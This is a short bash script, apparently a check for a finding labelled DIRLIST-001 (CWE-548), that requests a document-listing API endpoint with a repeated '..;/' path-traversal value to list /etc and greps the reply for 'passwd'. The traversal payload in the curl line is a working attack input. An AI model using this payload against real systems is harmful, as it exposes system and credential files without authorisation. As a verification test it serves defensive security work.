#!/usr/bin/env bash
# DIRLIST-001 (CWE-548): the /api/docs/list folder-browse endpoint enumerates an
# arbitrary directory through the same "..;/" bypass - here it lists /etc.
set -eu; . "$(dirname "$0")/_lib.sh"
curl -s "$TARGET/api/docs/list?path=..;/..;/..;/..;/..;/..;/etc" | grep -q 'passwd'
